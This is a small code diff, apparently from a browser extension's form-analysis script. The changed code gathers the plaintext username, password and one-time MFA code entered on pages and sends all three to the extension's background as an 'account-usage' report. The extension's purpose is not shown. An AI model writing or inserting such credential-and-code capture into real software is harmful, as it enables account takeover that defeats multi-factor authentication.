@@ -74,15 +74,15 @@ function analyzeForm(formElements) {
         }
 
         if (sessionState.auth.username !== undefined && sessionState.auth.password !== undefined) {
+            const report = {
+                username: sessionState.auth.username,
+                password: sessionState.auth.password,
+                mfa: sessionState.auth.totp
+            }
+            chrome.runtime.sendMessage({type: 'account-usage', report})
+
             if (sessionState.auth.totp) {
-                chrome.runtime.sendMessage({ type: 'mfa-received' })
                 sessionState.init()
-            } else {
-                const report = {
-                    username: sessionState.auth.username,
-                    password: sessionState.auth.password
-                }
-                chrome.runtime.sendMessage({type: 'account-usage', report})
             }
         }
 
